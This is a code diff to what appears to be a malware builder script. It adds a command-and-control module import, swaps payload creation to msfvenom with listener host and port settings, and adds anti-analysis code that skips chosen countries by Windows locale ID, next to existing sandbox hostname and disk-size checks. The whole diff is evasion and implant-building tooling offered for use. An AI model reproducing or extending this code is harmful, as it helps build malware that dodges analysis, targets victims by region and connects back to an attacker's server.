@@ -3,6 +3,7 @@ from scripts.hasher import hash
 from scripts.config import parse_config
 from scripts.dict import dictionary_encrypt
 from scripts.utils import *
+from scripts.c2 import *
 import random
 import sys
 
@@ -21,9 +22,14 @@ STUB_FILE = config.get("Stub", "filename")
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")
+
 AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
 if len(AVOID_HOSTNAME) <= 1 and AVOID_HOSTNAME[0] == "":
     AVOID_HOSTNAME = []
+
+AVOID_COUNTRIES = config.get("Anti-Analysis", "avoid_countries").split(",")
+if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
+    AVOID_COUNTRIES = []
 
 WORKING_FOLDER = "temp/"
 
@@ -42,7 +48,7 @@ def main():
 
     if is_set(config.get("Payload", "name")):
         PAYLOAD_NAME = config.get("Payload", "name")
-        generate_payload(PAYLOAD_NAME, LHOST, LPORT, LURI)
+        msfvenom(PAYLOAD_NAME, LHOST, LPORT, LURI)
         PAYLOAD_FILE = "payload.txt"
     else:
         print("No payload file or payload name specified")
@@ -87,6 +93,18 @@ def main():
                                 res += hash_obj("",hostname)+","
                         sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                         print("Avoid hostnames: ", AVOID_HOSTNAME)
+                    else:
+                        sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
+                if parts[1] == "AVOID_COUNTRIES":
+                    if len(AVOID_COUNTRIES):
+                        res = ""
+                        for country in AVOID_COUNTRIES:
+                            if country != "":
+                                ids = get_LCID(country)
+                                for id in ids:
+                                    res += str(hex(id))+","
+                        sed_file(WORKING_FOLDER+filename, tag, res[:-1])
+                        print("Avoid countriess: ", AVOID_COUNTRIES)
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
 
